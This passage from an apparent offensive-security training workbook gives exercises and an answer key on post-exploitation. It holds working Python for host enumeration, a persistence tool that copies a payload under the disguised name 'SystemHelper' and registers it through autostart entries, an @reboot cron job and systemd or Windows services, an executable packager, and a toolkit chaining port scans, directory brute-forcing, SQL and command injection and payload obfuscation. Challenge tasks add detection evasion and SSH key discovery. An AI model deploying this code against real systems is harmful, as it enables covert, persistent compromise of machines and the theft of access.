                if 'SERVICE_NAME:' in line:
                    name = line.split(':')[1].strip()
                    services.append(name)
        else:
            # Linux services
            if os.path.exists('/bin/systemctl'):
                output = subprocess.check_output(['systemctl', 'list-units', '--type=service'], text=True)
                for line in output.split('\n'):
                    if '.service' in line and not line.startswith(' '):
                        parts = line.split()
                        if len(parts) >= 3:
                            services.append({
                                'name': parts[0],
                                'status': parts[2]
                            })
        
        self.results['services'] = services
        return services
    
    def enumerate_all(self):
        """Perform complete enumeration"""
        print("[*] Starting system enumeration...")
        
        self.get_system_info()
        print("[+] System info collected")
        
        self.get_users()
        print("[+] User info collected")
        
        self.get_network()
        print("[+] Network info collected")
        
        self.get_processes()
        print("[+] Process info collected")
        
        self.get_services()
        print("[+] Service info collected")
        
        return self.results

if __name__ == "__main__":
    enumerator = SystemEnumerator()
    results = enumerator.enumerate_all()
    
    # Save results
    filename = f"enumeration_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[*] Results saved to {filename}")
    print("\n[*] Summary:")
    print(f"  System: {results['system']['os']} {results['system']['kernel']}")
    print(f"  Users: {len(results['users'])}")
    print(f"  Processes: {len(results['processes'])}")
    print(f"  Services: {len(results['services'])}")
```

**Challenge Tasks:**
1. Add Windows Registry enumeration
2. Implement file system scanning
3. Add SSH key discovery
4. Create automated reporting

---

### Exercise 4.3: Persistence

**Objective:** Implement persistence mechanisms.

**Instructions:**

Create `persistence_tool.py`:

```python
#!/usr/bin/env python3
import os
import platform
import subprocess
import shutil

class PersistenceManager:
    def __init__(self):
        self.platform = platform.system()
        self.payload_path = None
    
    def install_payload(self, source_path):
        """Install payload to a persistent location"""
        if not os.path.exists(source_path):
            print(f"[-] Payload not found: {source_path}")
            return False
        
        if self.platform == 'Windows':
            dest_dir = os.path.join(os.environ['APPDATA'], 'SystemHelper')
        else:
            dest_dir = os.path.join(os.path.expanduser('~'), '.cache', 'system-helper')
        
        os.makedirs(dest_dir, exist_ok=True)
        
        dest_path = os.path.join(dest_dir, os.path.basename(source_path))
        shutil.copy2(source_path, dest_path)
        
        if self.platform != 'Windows':
            os.chmod(dest_path, 0o755)
        
        self.payload_path = dest_path
        print(f"[+] Payload installed to {dest_path}")
        return True
    
    def add_startup(self):
        """Add to startup"""
        if not self.payload_path:
            print("[-] No payload installed")
            return False
        
        if self.platform == 'Windows':
            startup_dir = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            shortcut_path = os.path.join(startup_dir, 'SystemHelper.lnk')
            
            import winshell
            winshell.CreateShortcut(
                shortcut_path,
                target=self.payload_path,
                workdir=os.path.dirname(self.payload_path)
            )
            print(f"[+] Startup shortcut created: {shortcut_path}")
            
        else:
            desktop_path = os.path.join(
                os.path.expanduser('~'),
                '.config', 'autostart',
                'system-helper.desktop'
            )
            
            content = f"""
[Desktop Entry]
Type=Application
Exec={self.payload_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Helper
"""
            
            os.makedirs(os.path.dirname(desktop_path), exist_ok=True)
            with open(desktop_path, 'w') as f:
                f.write(content)
            os.chmod(desktop_path, 0o755)
            
            print(f"[+] Autostart entry created: {desktop_path}")
        
        return True
    
    def add_cron(self):
        """Add cron job (Linux only)"""
        if self.platform == 'Windows':
            print("[-] Cron not available on Windows")
            return False
        
        if not self.payload_path:
            print("[-] No payload installed")
            return False
        
        # Get current crontab
        current = subprocess.check_output(['crontab', '-l'], text=True, stderr=subprocess.DEVNULL)
        
        # Add entry
        entry = f"@reboot {self.payload_path} > /dev/null 2>&1"
        
        if entry in current:
            print("[*] Cron job already exists")
            return True
        
        new_crontab = current + "\n" + entry + "\n"
        process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
        process.communicate(new_crontab.encode())
        
        print("[+] Cron job added")
        return True
    
    def add_service(self):
        """Add system service"""
        if not self.payload_path:
            print("[-] No payload installed")
            return False
        
        if self.platform == 'Windows':
            service_name = 'SystemHelper'
            command = f'sc create "{service_name}" binPath= "{self.payload_path}" start= auto'
            subprocess.run(command, shell=True)
            print(f"[+] Windows service created: {service_name}")
            
        else:
            service_name = 'system-helper'
            service_path = f'/etc/systemd/system/{service_name}.service'
            
            content = f"""
[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart={self.payload_path}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
            
            with open(service_path, 'w') as f:
                f.write(content)
            
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', f'{service_name}.service'])
            subprocess.run(['systemctl', 'start', f'{service_name}.service'])
            
            print(f"[+] Systemd service created: {service_name}")
        
        return True
    
    def cleanup(self):
        """Remove all persistence"""
        print("[*] Cleaning up persistence...")
        
        # Remove service
        if self.platform == 'Linux':
            subprocess.run(['systemctl', 'stop', 'system-helper.service'], stderr=subprocess.DEVNULL)
            subprocess.run(['systemctl', 'disable', 'system-helper.service'], stderr=subprocess.DEVNULL)
            os.remove('/etc/systemd/system/system-helper.service')
        
        # Remove cron
        if self.platform == 'Linux':
            current = subprocess.check_output(['crontab', '-l'], text=True, stderr=subprocess.DEVNULL)
            lines = [line for line in current.split('\n') if 'system-helper' not in line]
            new_crontab = '\n'.join(lines)
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
            process.communicate(new_crontab.encode())
        
        # Remove autostart
        if self.platform == 'Linux':
            os.remove(os.path.join(os.path.expanduser('~'), '.config', 'autostart', 'system-helper.desktop'))
        
        print("[+] Cleanup complete")

if __name__ == "__main__":
    pm = PersistenceManager()
    
    # Install payload
    pm.install_payload('/bin/ls')
    
    # Add persistence
    pm.add_startup()
    pm.add_cron()
    pm.add_service()
    
    # Cleanup
    # pm.cleanup()
```

**Challenge Tasks:**
1. Add Windows Registry persistence
2. Implement scheduled tasks
3. Add detection evasion
4. Create persistence verification

---

### Exercise 4.4: Packaging

**Objective:** Package a Python script as an executable.

**Instructions:**

Create `package_tool.py`:

```python
#!/usr/bin/env python3
import subprocess
import sys
import os
import shutil

class PackageTool:
    def __init__(self):
        self.tools = self._detect_tools()
    
    def _detect_tools(self):
        """Detect available packaging tools"""
        tools = {}
        
        # Check PyInstaller
        try:
            import PyInstaller
            tools['pyinstaller'] = True
        except:
            tools['pyinstaller'] = False
        
        # Check cx_Freeze
        try:
            import cx_Freeze
            tools['cx_freeze'] = True
        except:
            tools['cx_freeze'] = False
        
        return tools
    
    def package_pyinstaller(self, script_path, output_name=None, console=True, icon=None):
        """Package using PyInstaller"""
        if not self.tools['pyinstaller']:
            print("[-] PyInstaller not installed")
            return False
        
        if not output_name:
            output_name = os.path.splitext(os.path.basename(script_path))[0]
        
        # Build command
        cmd = ['pyinstaller', '--onefile']
        
        if not console:
            cmd.append('--windowed')
        
        if icon:
            cmd.extend(['--icon', icon])
        
        cmd.extend(['--name', output_name])
        cmd.append(script_path)
        
        print(f"[*] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] Package created: dist/{output_name}")
            if sys.platform == 'win32':
                print(f"  {os.path.join('dist', output_name + '.exe')}")
            else:
                print(f"  {os.path.join('dist', output_name)}")
            return True
        else:
            print(f"[-] Packaging failed: {result.stderr}")
            return False
    
    def package_simple(self, script_path, output_name=None):
        """Simple packaging using shutil (copy)"""
        if not output_name:
            output_name = os.path.basename(script_path)
        
        # Copy script and make executable
        dist_dir = 'dist'
        os.makedirs(dist_dir, exist_ok=True)
        
        dest_path = os.path.join(dist_dir, output_name)
        shutil.copy2(script_path, dest_path)
        
        # Make executable on Unix
        if sys.platform != 'win32':
            os.chmod(dest_path, 0o755)
        
        print(f"[+] Package created: {dest_path}")
        return True
    
    def package_all(self, script_path):
        """Package using all available tools"""
        results = []
        
        if self.tools['pyinstaller']:
            print("\n[*] Packaging with PyInstaller...")
            results.append(self.package_pyinstaller(script_path))
        
        print("\n[*] Creating simple package...")
        results.append(self.package_simple(script_path))
        
        return results

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Package Python scripts")
    parser.add_argument('script', help='Python script to package')
    parser.add_argument('-o', '--output', help='Output name')
    parser.add_argument('--console', action='store_true', help='Show console window')
    parser.add_argument('--icon', help='Icon file for Windows')
    parser.add_argument('--all', action='store_true', help='Use all packaging tools')
    
    args = parser.parse_args()
    
    packager = PackageTool()
    
    if args.all:
        packager.package_all(args.script)
    else:
        if packager.tools['pyinstaller']:
            packager.package_pyinstaller(
                args.script,
                output_name=args.output,
                console=args.console,
                icon=args.icon
            )
        else:
            packager.package_simple(args.script, args.output)
```

**Challenge Tasks:**
1. Add UPX compression
2. Implement code signing
3. Add dependency bundling
4. Create cross-platform builder

---

## Final Project

### Building a Complete Security Toolkit

**Objective:** Integrate all components into a single toolkit.

**Instructions:**

Create `toolkit.py`:

```python
#!/usr/bin/env python3
"""
Complete Security Toolkit
Integration of all modules
"""

import sys
import os
import json
from datetime import datetime

# Import modules
from recon.port_scanner import PortScanner
from recon.packet_crafter import AdvancedPacketTools
from web_attack.brute_forcer import DirectoryBruteForcer
from web_attack.html_analyzer import HTMLAnalyzer
from web_attack.auth_automation import AuthAutomation
from exploit.exploit_framework import SQLInjectionExploit, CommandInjectionExploit
from exploit.obfuscator import ObfuscationEngine
from post_exploit.enumerator import SystemEnumerator
from post_exploit.persistence import PersistenceManager

class SecurityToolkit:
    def __init__(self):
        self.results = []
        self.start_time = datetime.now()
    
    def scan(self, target, ports=None):
        """Perform port scan"""
        print(f"\n[*] Scanning {target}")
        if not ports:
            ports = [21, 22, 23, 25, 53, 80, 443, 3306, 3389]
        
        scanner = PortScanner(target, ports, max_threads=50)
        results = scanner.scan()
        self.results.append({'type': 'scan', 'target': target, 'results': results})
        return results
    
    def web_scan(self, url):
        """Perform web reconnaissance"""
        print(f"\n[*] Web scanning {url}")
        results = {}
        
        # Directory brute force
        wordlist = ['admin', 'login', 'backup', 'config', 'wp-admin']
        brute = DirectoryBruteForcer(url, wordlist)
        results['directories'] = brute.scan()
        
        # HTML analysis
        analyzer = HTMLAnalyzer()
        analysis = analyzer.analyze_url(url)
        results['analysis'] = analysis
        
        self.results.append({'type': 'web', 'target': url, 'results': results})
        return results
    
    def exploit(self, target, vulnerability_type, parameter=None):
        """Run exploits"""
        print(f"\n[*] Testing {target} for {vulnerability_type}")
        
        if vulnerability_type == 'sql':
            exploit = SQLInjectionExploit(target, parameter)
            result = exploit.exploit()
        elif vulnerability_type == 'cmd':
            exploit = CommandInjectionExploit(target, parameter)
            result = exploit.exploit()
        else:
            print("[-] Unknown exploit type")
            return None
        
        self.results.append({'type': 'exploit', 'target': target, 'result': result})
        return result
    
    def obfuscate(self, payload, techniques=None):
        """Obfuscate a payload"""
        print(f"\n[*] Obfuscating payload")
        engine = ObfuscationEngine()
        
        if techniques:
            result = engine.multi_encode(payload, techniques)
        else:
            result = engine.encode_base64(payload)
        
        self.results.append({'type': 'obfuscate', 'original': payload, 'result': result})
        return result
    
    def enumerate(self):
        """Enumerate the current system"""
        print(f"\n[*] Enumerating system")
        enumerator = SystemEnumerator()
        results = enumerator.enumerate_all()
        
        self.results.append({'type': 'enumerate', 'results': results})
        return results
    
    def report(self):
        """Generate a report of all activities"""
        report = {
            'timestamp': self.start_time.isoformat(),
            'duration': str(datetime.now() - self.start_time),
            'activities': self.results
        }
        
        # Save report
        filename = f"toolkit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\n[+] Report saved to {filename}")
        return report

def main():
    """Command-line interface"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Security Toolkit")
    parser.add_argument('--scan', help='Target to scan')
    parser.add_argument('--ports', help='Ports to scan (comma-separated)')
    parser.add_argument('--web', help='URL for web scan')
    parser.add_argument('--exploit', help='Target for exploit')
    parser.add_argument('--exploit-type', choices=['sql', 'cmd'], help='Exploit type')
    parser.add_argument('--parameter', help='Parameter for exploit')
    parser.add_argument('--obfuscate', help='Payload to obfuscate')
    parser.add_argument('--techniques', help='Obfuscation techniques (comma-separated)')
    parser.add_argument('--enumerate', action='store_true', help='Enumerate system')
    parser.add_argument('--report', action='store_true', help='Generate report')
    
    args = parser.parse_args()
    
    toolkit = SecurityToolkit()
    
    if args.scan:
        ports = [int(p) for p in args.ports.split(',')] if args.ports else None
        toolkit.scan(args.scan, ports)
    
    if args.web:
        toolkit.web_scan(args.web)
    
    if args.exploit and args.exploit_type:
        toolkit.exploit(args.exploit, args.exploit_type, args.parameter)
    
    if args.obfuscate:
        techniques = args.techniques.split(',') if args.techniques else None
        toolkit.obfuscate(args.obfuscate, techniques)
    
    if args.enumerate:
        toolkit.enumerate()
    
    if args.report:
        toolkit.report()
    
    if not any(vars(args).values()):
        print("Usage: python3 toolkit.py --scan 192.168.1.1 --web https://example.com")

if __name__ == "__main__":
    main()
```

---

## Answer Key

### Exercise 0.1

**Question 1:** Why do we use `connect_ex()` instead of `connect()`?

**Answer:** `connect_ex()` returns an error code instead of raising an exception, making it easier to handle connection failures gracefully.

---

### Exercise 1.1

**Question 2:** What happens if a client sends very large data?

**Answer:** The `recv(1024)` call would only read the first 1024 bytes. The remaining data would stay in the buffer and be read in subsequent calls. A robust server would loop until all data is received.

---

### Exercise 1.2

**Question 1:** Why does UDP have packet loss?

**Answer:** UDP is connectionless and doesn't guarantee delivery, ordering, or error checking. Packets can be dropped by routers or lost in transit.

---

### Exercise 2.2

**Question 1:** How would you make the directory brute-forcer faster?

**Answer:** 
- Increase thread count
- Use asynchronous I/O with `aiohttp`
- Implement connection pooling
- Use `concurrent.futures`
- Reduce timeouts

---

### Exercise 3.2

**Question 1:** What makes a SQL injection payload effective?

**Answer:** Effective payloads exploit the structure of SQL queries by:
- Terminating the original query with `--` or `;`
- Using `UNION` to combine queries
- Exploiting error messages for information
- Using time-based delays for blind injection

---

### Final Project

**Question:** How would you extend the toolkit?

**Answer:**
1. Add more exploit types (XSS, LFI, RFI)
2. Implement plugins system
3. Add web interface
4. Support more C2 channels
5. Add reporting in multiple formats
6. Implement automated vulnerability scanning

---

## Workbook Complete

### Checklist

- [x] Part 0: Getting Started (3 exercises)
- [x] Phase 1: Network Fundamentals (4 exercises)
- [x] Phase 2: Web Reconnaissance (4 exercises)
- [x] Phase 3: Offensive Tooling (4 exercises)
- [x] Phase 4: Post-Exploitation (4 exercises)
- [x] Final Project (1 exercise)
- [x] Answer Key

### Self-Assessment

| Module | Completed | Confidence | Notes |
|--------|-----------|------------|-------|
| Part 0 | ☐ | 1-5 | |
| Phase 1.1 | ☐ | 1-5 | |
| Phase 1.2 | ☐ | 1-5 | |
| Phase 1.3 | ☐ | 1-5 | |
| Phase 1.4 | ☐ | 1-5 | |
| Phase 2.1 | ☐ | 1-5 | |
| Phase 2.2 | ☐ | 1-5 | |
| Phase 2.3 | ☐ | 1-5 | |
| Phase 2.4 | ☐ | 1-5 | |
| Phase 3.1 | ☐ | 1-5 | |
| Phase 3.2 | ☐ | 1-5 | |
| Phase 3.3 | ☐ | 1-5 | |
| Phase 3.4 | ☐ | 1-5 | |
| Phase 4.1 | ☐ | 1-5 | |
| Phase 4.2 | ☐ | 1-5 | |
| Phase 4.3 | ☐ | 1-5 | |
| Phase 4.4 | ☐ | 1-5 | |
| Final Project | ☐ | 1-5 | |

---

**[WORKBOOK COMPLETE]**
